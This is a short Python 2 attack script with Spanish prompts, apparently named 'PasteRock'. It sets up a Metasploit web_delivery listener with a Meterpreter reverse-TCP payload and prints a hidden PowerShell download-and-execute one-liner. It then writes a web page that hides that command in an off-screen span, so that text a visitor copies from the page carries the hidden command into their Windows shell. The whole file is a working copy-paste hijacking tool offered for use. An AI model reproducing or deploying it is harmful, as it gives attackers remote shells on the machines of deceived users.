#-*- coding: utf-8 -*-
import os

def windowsinfect():
	resultado=raw_input("¿Ya creo la powershell? (si/no): ")
	if resultado == "no":
		print "[x]Limpiando..."
		os.system("rm /var/www/html/index.html")
		os.system("rm meta_config")
		ip=raw_input("ingrese ip: ")
		port=raw_input("ingrese puerto: ")
		print "[*]Creando powershell..."
		documento="meta_config"
		archivo = open(documento,"w")
		archivo.write("""use exploit/multi/script/web_delivery
set URIPATCH /
set target 2
set payload windows/meterpreter/reverse_tcp
set lhost """+ip+"""
set lport """+port+"""
exploit""")
		archivo.close()
		print """Por favor, copie la powershell, e inicie de nuevo PasteRock, ejemplo: powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://192.168.0.22:8080/puaKQmKR');"""
		os.system("msfconsole -r meta_config")
	elif resultado == "si":
		mensaje1=raw_input("Primer Mensaje: ")		
		mensaje2=raw_input("Segundo Mensaje: ")
		comando=raw_input("Comando: ")
		powershell=raw_input("Por favor, ingrese la powershell: ")
		ip=raw_input("ingrese ip: ")
		index="index.html"
		job=open(index,"w")	
		job.write("""<p> """ + mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >c:\ & cls & """+powershell+"""  c:\ & cls <br> """ + comando + """ </span> """ + mensaje2 + """ </p> """)
		job.close()
		os.system("cp index.html /var/www/html")
		print "[:D] Todo esta completo http://"+ip+"/ Con toda campeon ;v"
	else:
		print "Escriba lo que es."
